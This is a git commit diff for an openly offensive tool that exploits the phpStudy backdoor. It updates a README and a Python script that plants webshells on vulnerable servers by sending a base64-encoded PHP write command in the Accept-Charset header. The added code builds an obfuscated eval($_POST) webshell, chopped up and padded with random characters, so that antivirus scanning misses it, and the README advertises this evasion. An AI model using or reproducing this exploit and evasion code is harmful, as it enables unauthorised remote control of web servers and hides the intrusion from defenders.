b02b391ac9040207f16c363a6d867d6d641a4eb6
xzajyjs <xuziang16@gmail.com>
2022-02-05 21:58:16 +0800

    update anti-virus

--- README.md
+++ README.md
@@ -1,9 +1,11 @@
 # phpstudy_Backdoor-EXP
 
-- [x] Support random and custom webshell name and password
-- [x] Support to detect the existence of vulnerabilities(POC)
-- [x] Support to record webshell which url exists backdoor.
-- [x] phpstudy Version : 5.2.17 and 5.4.45
+- [x] 支持随机和自定义webshell名和连接密钥。Support random and custom webshell name and password.
+- [x] 支持静态免杀。Support Static Anti-Virus([click on me](https://github.com/xzajyjs/Anti-Virus-PHP))
+- [x] 支持验证漏洞存在性。Support to detect the existence of vulnerabilities(POC)
+- [x] 支持记录存在后门的网站url和webshell信息。Support to record webshell which url exists backdoor.
+- [x] 支持phpstudy版本：5.2.17和5.4.45。phpstudy Version : 5.2.17 and 5.4.45
 
 ![](pic/exp.png)
 ![](pic/conn.png)
+![](pic/totalvirus.png)
--- phpstudy_exp.py
+++ phpstudy_exp.py
@@ -23,6 +23,46 @@ def get_standard_url(url):
     else:
         return False
 
+def confuse_insert(replace_string,i,confusing_characters=""):
+    encoded_replace_string = ""
+    if confusing_characters=="":
+        confusing_characters = ''.join(random.sample(string.ascii_letters+string.digits,i))
+    
+    while True:
+        rand_len = random.randint(1,4)
+        if len(replace_string) <= rand_len:
+            encoded_replace_string += replace_string[:rand_len]+confusing_characters
+            break
+        encoded_replace_string += replace_string[:rand_len]+confusing_characters
+        replace_string = replace_string[rand_len:]
+    return confusing_characters,encoded_replace_string
+
+def free_to_kill(key):
+    replace_function = confuse_insert("str_replace",60)
+    decode_function = confuse_insert("base64_decode",50)
+    create_function = confuse_insert("create_function",60)
+
+    shell_state = f"eval($_POST['{key}']);"
+    encoded_shell_state = str(base64.b64encode(shell_state.encode('utf-8'))).split("'",2)[1]
+
+    tmp_state_one = confuse_insert(encoded_shell_state[:8],50)
+    state_one = tmp_state_one[1]
+    state_two = confuse_insert(encoded_shell_state[8:16],50,tmp_state_one[0])[1]
+    state_three = confuse_insert(encoded_shell_state[16:],50,tmp_state_one[0])[1]
+
+    with open("shell.php","w") as f:
+        statement = f"""<?php
+$rep = str_replace("{replace_function[0]}","","{replace_function[1]}");
+$decode = $rep("{decode_function[0]}","","{decode_function[1]}");
+$func = $rep("{create_function[0]}","","{create_function[1]}");
+$s1 = "{state_one}";
+$s2 = "{state_two}";
+$s3 = "{state_three}";
+$ttk = $func("",$decode($rep("{tmp_state_one[0]}","",$s1.$s2.$s3)));
+$ttk();
+?>"""
+        f.write(statement)
+
 def exp():
     head["Accept-Charset"] = "c3lzdGVtKCJjaGRpciIpOw==" # system("chdir")
     res1 = requests.get(url=url,headers=head,timeout=5,allow_redirects=False)
@@ -36,8 +76,11 @@ def exp():
         key = ''.join(random.sample(string.ascii_letters+string.digits,4))
     else:
         key = arg.key
+    free_to_kill(key)
     def write_shell(version_path):
-        exp = f"fputs(fopen('{path}\{version_path}\WWW\{shell_name}.php','w'),'<?php @eval($_POST[{key}]); ?>');"
+        with open("shell.php","r") as f:
+            shell = f.read()
+        exp = f"fputs(fopen('{path}\{version_path}\WWW\{shell_name}.php','w'),'{shell}');"
         exp_encode = str(base64.b64encode(exp.encode('utf-8'))).split("'",2)[1]
         head['Accept-Charset'] = exp_encode
         requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
